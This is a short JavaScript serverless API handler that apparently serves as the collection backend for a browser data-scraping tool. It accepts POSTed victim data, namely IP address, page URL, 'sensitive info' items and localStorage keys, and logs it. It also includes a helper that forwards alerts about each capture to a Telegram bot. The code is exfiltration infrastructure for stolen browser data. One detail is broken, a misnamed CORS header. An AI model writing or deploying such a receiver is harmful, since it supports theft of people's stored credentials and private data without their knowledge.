export default async function handler(req, res) {
    // Allow CORS for frontend requests
    res.setHeader('Access-Control-Allow-Cors', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST');

    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    try {
        const data = req.body;
        
        // LOGIC: Here you would send data to Telegram/Dashboard
        // Example: Log to Vercel Console
        console.log('--- New Scrape Request ---');
        console.log('IP:', data.ip);
        console.log('URL:', data.url);
        console.log('Sensitive Info Found:', data.sensitiveInfo.length > 0 ? 'YES' : 'NO');
        console.log('LocalStorage Keys:', Object.keys(data.storage.localStorage));
        
        // If you have Telegram Bot Token, uncomment below:
        // await sendToTelegram(data);

        return res.status(200).json({ 
            success: true, 
            message: 'Data received',
            itemsFound: data.sensitiveInfo.length 
        });
    } catch (error) {
        console.error('API Error:', error);
        return res.status(500).json({ error: 'Internal Server Error' });
    }
}

// Helper function example for Telegram
async function sendToTelegram(data) {
    const token = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;
    
    if (!token || !chatId) return;

    const message = `
🚨 *New Scrape Alert*
IP: ${data.ip}
URL: ${data.url}
Sensitive Items: ${data.sensitiveInfo.length}
`;

    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: chatId,
            text: message,
            parse_mode: 'Markdown'
        })
    });
}
